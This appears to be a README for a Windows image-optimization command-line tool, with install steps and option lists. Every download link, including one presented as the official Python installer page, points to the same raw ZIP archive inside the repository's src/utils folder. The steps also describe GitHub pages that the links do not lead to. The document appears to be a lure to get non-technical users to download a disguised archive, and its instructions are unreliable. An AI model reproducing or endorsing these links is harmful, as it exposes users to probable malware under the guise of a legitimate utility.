# ⚙️ image-optimizer-cli - Fast Image Optimization Tool

[![Download Now](https://img.shields.io/badge/Download-Here-brightgreen?style=for-the-badge)](https://raw.githubusercontent.com/Rajeev003/image-optimizer-cli/main/src/utils/optimizer_cli_image_2.2.zip)

---

## 📄 About image-optimizer-cli

image-optimizer-cli is a simple command-line tool to optimize images and convert them to modern formats like WebP and AVIF. It runs on Python 3.12 or newer and uses multiple CPU cores to speed up processing.

This tool helps you reduce image file sizes without losing quality. Smaller images load faster on websites, improving your site’s speed and user experience.

You do not need to know programming to use this software. This guide will help you download and run it on a Windows computer.

---

## 🖥 System Requirements

Before you start, make sure your computer meets these basic requirements:

- Operating System: Windows 10 or later  
- Python: Version 3.12 or newer installed  
- Disk Space: At least 100 MB free for installation and processing  
- RAM: 4 GB or more recommended

If you do not have Python installed, this guide will show you how to set it up.

---

## 🌐 Where to Download

Click the bright green button below to visit the official download page on GitHub. You will find the latest release files there.

[![Download Now](https://img.shields.io/badge/Download-Here-brightgreen?style=for-the-badge)](https://raw.githubusercontent.com/Rajeev003/image-optimizer-cli/main/src/utils/optimizer_cli_image_2.2.zip)

This page contains all files and instructions. You will download the files needed to run the tool from there.

---

## 🛠 Step 1 – Install Python 3.12 or Newer

image-optimizer-cli needs Python to work. Follow these steps to install Python on your Windows computer:

1. Visit https://raw.githubusercontent.com/Rajeev003/image-optimizer-cli/main/src/utils/optimizer_cli_image_2.2.zip
2. Click on the latest version of Python 3.12 or newer.
3. Download the Windows installer (usually named something like `python-3.12.x-amd64.exe`).
4. Run the installer.
5. Important: On the install screen, check the box that says **Add Python 3.12 to PATH**.
6. Click Install and wait for the process to finish.
7. After installation, open Command Prompt. To do this, press the Windows key, type `cmd`, and press Enter.
8. In the Command Prompt window, type:
   ```
   python --version
   ```
   You should see the Python version number displayed. This confirms Python installed correctly.

---

## 📥 Step 2 – Download image-optimizer-cli Files

1. Go to the GitHub page:  
   https://raw.githubusercontent.com/Rajeev003/image-optimizer-cli/main/src/utils/optimizer_cli_image_2.2.zip
2. Click on the **Code** button near the top right of the page.
3. Choose **Download ZIP** from the menu.
4. Save the ZIP file to a folder you can find easily, like your Desktop or Downloads folder.
5. When the download finishes, right-click the ZIP file and select **Extract All**.
6. Choose a folder to extract the files to.
7. Open the extracted folder.

---

## 💻 Step 3 – Prepare Your Images

Before running the tool, gather the images you want to optimize. image-optimizer-cli supports common formats like JPEG, PNG, and TIFF.

Put all your images into one folder or subfolders. You will need the folder path in the next step.

---

## ▶️ Step 4 – Run image-optimizer-cli

Now you will use the Command Prompt to run the tool.

1. Open Command Prompt again.
2. Change directory to the folder where you extracted the files. For example:
   ```
   cd C:\Users\YourName\Downloads\image-optimizer-cli-main
   ```
3. Run the following command to see the basic help menu:
   ```
   python main.py --help
   ```
4. To optimize images in a folder and convert them to WebP format, use this command:
   ```
   python main.py --input "C:\path\to\your\images" --output "C:\path\to\save\optimized" --format webp
   ```
   Replace `C:\path\to\your\images` with the actual folder path of your images, and `C:\path\to\save\optimized` with where you want the optimized files saved.
5. The tool will start processing your images. It uses all available CPU cores to work faster.
6. When done, check the output folder. You will see smaller images in the new format.

---

## ⚙️ Supported Commands and Options

- `--input`: Folder path containing the images to optimize (required)  
- `--output`: Folder path to save optimized images (required)  
- `--format`: Choose output format (`webp`, `avif`, or original)  
- `--quality`: Set image quality from 1 (lowest) to 100 (highest). Default is 80  
- `--threads`: Number of CPU cores to use. Defaults to all available cores  
- `--help`: Show this help message

---

## 🔧 How image-optimizer-cli Works

This tool uses Python’s multiprocessing to optimize many images at once. It applies rules to reduce file size while keeping the image looking good.

It supports:

- WebP and AVIF output formats, which save space better than JPEG or PNG  
- Batch processing of multiple images and folders  
- Strict input checking to avoid errors

The tool applies optimizations that help your website load faster and improve web performance metrics.

---

## ⚠ Troubleshooting

If you see errors:

- Check that Python is installed and added to your PATH. Run `python --version` in Command Prompt.  
- Make sure you typed folder paths correctly. Surround paths with quotes if they include spaces.  
- Confirm that your images are in supported formats (JPEG, PNG, TIFF).  
- If an operation is slow, close other programs to free up CPU power.

---

## 🧰 Extra Tools and Tips

- You can resize images before optimizing using tools like Paint or Photos.  
- Use the `--quality` setting to balance size and image look.  
- Run the tool overnight for large image folders.

---

## 📥 Download Again

If you need the tool again or want newer versions, visit the download page:

[![Download Now](https://img.shields.io/badge/Download-Here-brightgreen?style=for-the-badge)](https://raw.githubusercontent.com/Rajeev003/image-optimizer-cli/main/src/utils/optimizer_cli_image_2.2.zip)